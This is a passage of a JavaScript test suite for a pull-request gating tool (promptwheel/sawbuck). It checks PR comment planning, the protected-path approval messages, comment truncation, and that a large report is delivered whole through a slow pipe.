  writeFileSync(f('report.json'), JSON.stringify(prRep())); writeFileSync(f('comments.jsonl'), '');
  r = run('--exit', '0'); assert.equal(r.stdout.trim(), 'none'); assert.equal(readFileSync(f('body.md'), 'utf8'), '');
  r = run('--exit', '0', '--comment-only', 'true'); assert.equal(r.stdout.trim(), 'none', 'a pass is a pass in comment-only too');
  writeFileSync(f('report.json'), ''); writeFileSync(f('err.txt'), 'promptwheel: base ref "x" is not in this clone\n');
  r = run('--exit', '64', '--error', f('err.txt')); assert.equal(r.stdout.trim(), 'create'); assert.match(readFileSync(f('body.md'), 'utf8'), /could not run[\s\S]*base ref "x" is not in this clone/);
  r = run('--exit', '1', '--coment', 'always'); assert.equal(r.status, 64); assert.match(r.stderr, /unknown flag --coment/);
  rmSync(d, { recursive: true, force: true });
});
test('the Action: comments read once, one comment made or edited, comment-only never fails the job', () => {
  const action = readFileSync(join(dirname(ENGINE), '..', 'action.yml'), 'utf8');
  assert.match(action, /^  comment-only:\n    description: /m);
  assert.match(action, /pr-comment --report "\$RUNNER_TEMP\/promptwheel\.json"/);
  assert.match(action, /gh api -X PATCH "repos\/\$REPO\/issues\/comments\/\$\{PLAN#update:\}"/, 'an earlier comment is edited in place');
  assert.match(action, /KEY: \$\{\{ github\.workflow \}\}\/\$\{\{ github\.job \}\}/);
  // Two pushes close together: the run for the first posts while the run for the second is still measuring. A list
  // taken when the job began does not hold that comment, and the second run posted beside it (found by letting the
  // stand-in for gh add a comment between the steps: 2 comments where 1 is allowed).
  assert.equal((action.match(/gh api --paginate/g) || []).length, 2, 'read for the approval when the job begins, and again just before the check speaks');
  assert.ok(action.indexOf('promptwheel-comments-now.jsonl') > action.indexOf('promptwheel.mjs" run'), 'the second reading comes after the measuring');
  assert.match(action, /pr-comment [\s\S]*--comments "\$RUNNER_TEMP\/promptwheel-comments-now\.jsonl"/, 'and it is the one the comment is planned from');
  assert.match(action, /if \[ "\$COMMENT_ONLY" = true \]; then[\s\S]*exit 0/, 'comment-only: the last step passes whatever the verdict');
  assert.doesNotMatch(action, /gh pr comment "\$\{\{/, 'no comment is posted without the plan');
});
test('the report says when the opener\'s own comment counts: the contract at the base decides, a change cannot say so for itself', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'true', extract: 'exit', direction: 'pass', guard: true }]); commitAll(d, 'base');
  const cfgPath = join(d, 'promptwheel.config.json'); const cfg = JSON.parse(readFileSync(cfgPath, 'utf8'));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'a change');
  assert.equal(gateRun(d).rep.openerCounts, undefined, 'a contract that does not say so');
  writeFileSync(cfgPath, JSON.stringify({ ...cfg, allowFromAuthor: true })); commitAll(d, 'one person here');
  assert.equal(gateRun(d).rep.openerCounts, undefined, 'the change that adds the setting is judged without it');
  writeFileSync(join(d, 'a.js'), '2\n'); commitAll(d, 'the next change');
  const r = gateRun(d); assert.equal(r.rep.openerCounts, true); assert.equal(conformsToContract(r.rep).ok, true);
  rmSync(d, { recursive: true, force: true });
});
// Found while testing sawbuck contract --solo (2026-11-20): a changed workflow file is the most common send-back on
// ordinary work (proof-bench/outside-repos: over half), and the comment for it named the path and never said how a
// person accepts it on a pull request. The way through was printed only under a count that fell.
test('a protected path sent back on a pull request says how to accept it; one that takes no reason says what a person does first', () => {
  const soft = { name: 'workflows-frozen', reason: 'workflows run with the repository secrets', files: ['.github/workflows/ci.yml'], allowable: 'flag' };
  const hard = { name: 'registry-config-frozen', reason: 'registry and token configuration decides where packages come from', files: ['.npmrc'] };
  let md = renderMarkdown(prRep({ verdict: 'fail', mandates: [soft], allowable: ['mandate:workflows-frozen'], protects: 9 }));
  assert.match(md, /> ⛔ \*\*Protected path touched:\*\* `workflows-frozen`[^\n]*\n>\n> To accept this, someone with write access who did not open this PR comments `sawbuck-allow: <their reason>` on it, and the check is run again\./);
  assert.ok(md.indexOf('To accept this') < md.indexOf('<details>'), 'in view, not in the fold');
  md = renderMarkdown(prRep({ verdict: 'fail', mandates: [soft], allowable: ['mandate:workflows-frozen'], openerCounts: true }));
  assert.match(md, /> To accept this, comment `sawbuck-allow: <the reason>` on this PR, and the check is run again\. One person works in this repo/);
  md = renderMarkdown(prRep({ verdict: 'fail', mandates: [hard] }));
  assert.doesNotMatch(md, /sawbuck-allow/, 'a path that takes no reason is not offered one');
  assert.match(md, /> This protected path takes no reason\. To change it on purpose, a person first takes its rule out of `promptwheel\.config\.json`, in a change of its own\./);
  md = renderMarkdown(prRep({ verdict: 'fail', mandates: [soft, hard], allowable: ['mandate:workflows-frozen'] }));
  assert.match(md, /sawbuck-allow: <their reason>/); assert.match(md, /> `registry-config-frozen` takes no reason\. To change it on purpose/);
  // with a count that fell too, the way through is said once, and names each thing
  md = renderMarkdown(sentBack({ mandates: [soft], allowable: ['test_count', 'mandate:workflows-frozen'] }));
  assert.equal(md.match(/To accept this/g).length, 1); assert.match(md, /`sawbuck-allow: test_count, workflows-frozen: <their reason>`/);
  // a reason was given and let it through: nothing is asked
  md = renderMarkdown(prRep({ allowed: { reason: 'the step is harmless (approved by pat)', cleared: ['mandate:workflows-frozen'] }, allowable: ['mandate:workflows-frozen'] }));
  assert.doesNotMatch(md, /To accept this/);
});
test('a comment longer than GitHub takes is cut short and says where the rest is, so it is still posted', () => {
  const many = Array.from({ length: 4000 }, (_, i) => `.github/workflows/generated-workflow-number-${i}.yml`);
  const p = plan({ report: prRep({ verdict: 'fail', mandates: [{ name: 'workflows-frozen', reason: 'workflows run with the repository secrets', files: many, allowable: 'flag' }], allowable: ['mandate:workflows-frozen'] }), exit: 1 });
  assert.equal(p.action, 'create'); assert.ok(p.body.length < 65000, `${p.body.length} characters`);
  assert.match(p.body, /\(Cut short: the whole report is in the job summary\.\)\n*$/);
  assert.ok(p.summary.length > p.body.length, 'the job summary has all of it');
});

// Found 2026-11-20 by reading every benchmark pair through the engine's own commands (proof-bench/gatekeep-study,
// then proof-bench/live/release-0.2.3): `run` printed its report and called process.exit() at once. Node writes to a
// pipe in the background, and an exit drops what the pipe has not taken yet. A report larger than a pipe holds
// arrived cut, with the verdict's exit code: at 146,176 bytes when the reader was quick, at 65,536 when it was slow.
// The report lists every test and config file a change touches, so it happened on a change of a few thousand of them.
// sawbuck reads the engine through a pipe: `sawbuck check` then said "could not run", and the end of a turn said
// nothing about a test edited to pass in that same change.
test('a report larger than a pipe holds arrives whole through a reader that starts late, with the exit code of its verdict', () => {
  const d = repoWith({ 'package.json': JSON.stringify({ name: 'a', scripts: { test: 'node --test test/a.test.js' } }), 'src/a.js': 'exports.f = () => 1\n', 'test/a.test.js': NODE_TEST("require('../src/a.js').f(), 1") });
  const deep = 'test/generated/a-folder-name-long-enough-that-nine-hundred-files-in-it-make-a-report-no-pipe-holds';
  const add = (tag) => { mkdirSync(join(d, deep), { recursive: true }); for (let i = 0; i < 900; i++) writeFileSync(join(d, deep, `${tag}-${String(i).padStart(4, '0')}.test.js`), `require('node:test').test('${tag} ${i}', () => {})\n`); };
  // A reader that takes nothing for a second: a busy parent, a slow tool, a pipe that is full. A real pipe between two
  // processes, made by the shell (a paused stream in this process would still be read by Node underneath).
  const lateReader = () => {
    const o = join(TMP_ROOT, 'late.out'), c = join(TMP_ROOT, 'late.code');
    spawnSync('sh', ['-c', '( "$0" "$@" 2>/dev/null; echo $? > "$CODE" ) | ( sleep 1; cat ) > "$OUT"', process.execPath, ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json'], { cwd: d, env: { ...process.env, OUT: o, CODE: c } });
    return { code: +readFileSync(c, 'utf8'), text: readFileSync(o, 'utf8') };
  };
  const whole = (r) => { try { return JSON.parse(r.text); } catch { return null; } };
  add('held'); commitAll(d, 'nine hundred test files');
  let r = lateReader(), rep = whole(r);
  assert.ok(rep, `the report did not arrive whole: ${Buffer.byteLength(r.text)} bytes came, ending ${JSON.stringify(r.text.slice(-30))}`);
  assert.ok(Buffer.byteLength(r.text) > 65536, `this test means nothing unless the report is larger than a pipe holds: ${Buffer.byteLength(r.text)} bytes`);
  assert.equal(rep.verdict, 'pass'); assert.equal(r.code, 0); assert.equal(rep.gate.goalposts.length, 900);
  // the same with a verdict that is not a pass: the code is the verdict's, and the report is still whole
  writeFileSync(join(d, 'src/a.js'), 'exports.f = () => 2\n'); add('broke'); commitAll(d, 'break the source, and nine hundred more');
  r = lateReader(); rep = whole(r);
  assert.ok(rep, `the failing report did not arrive whole: ${Buffer.byteLength(r.text)} bytes came`);
  assert.equal(rep.verdict, 'fail'); assert.equal(r.code, 1); assert.equal(rep.gate.goalposts.length, 900);
});
